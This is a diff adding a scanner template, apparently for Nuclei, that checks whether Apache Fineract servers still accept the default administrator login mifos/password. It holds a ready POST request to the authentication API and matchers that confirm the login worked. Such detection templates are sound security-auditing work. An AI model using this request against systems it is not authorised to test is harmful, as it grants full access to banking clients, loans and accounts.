@@ -1,0 +1,53 @@
+id: apache-fineract-default-login
+
+info:
+  name: Apache Fineract - Default Login
+  author: s4e-io
+  severity: high
+  description: |
+    Apache Fineract ships with the default administrator account mifos/password in the default tenant. An attacker can authenticate to the core banking API with full permissions and read or modify clients, loans, savings accounts and accounting data.
+  reference:
+    - https://github.com/apache/fineract/blob/1.16.1/README.md
+    - https://github.com/apache/fineract/blob/1.16.1/fineract-provider/src/main/resources/db/changelog/tenant/parts/0002_initial_data.xml
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+    cpe: cpe:2.3:a:apache:fineract:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    vendor: apache
+    product: fineract
+  tags: apache,fineract,mifos,default-login,vuln
+
+http:
+  - raw:
+      - |
+        POST /fineract-provider/api/v1/authentication HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Fineract-Platform-TenantId: default
+
+        {"username":"{{username}}","password":"{{password}}"}
+
+    attack: pitchfork
+    payloads:
+      username:
+        - mifos
+      password:
+        - password
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(content_type, "application/json")'
+          - 'contains(body, "\"authenticated\":true")'
+          - 'contains(body, "\"base64EncodedAuthenticationKey\":")'
+          - 'contains(body, "\"username\":\"mifos\"")'
+        condition: and
+
+    extractors:
+      - type: dsl
+        dsl:
+          - username + ":" + password
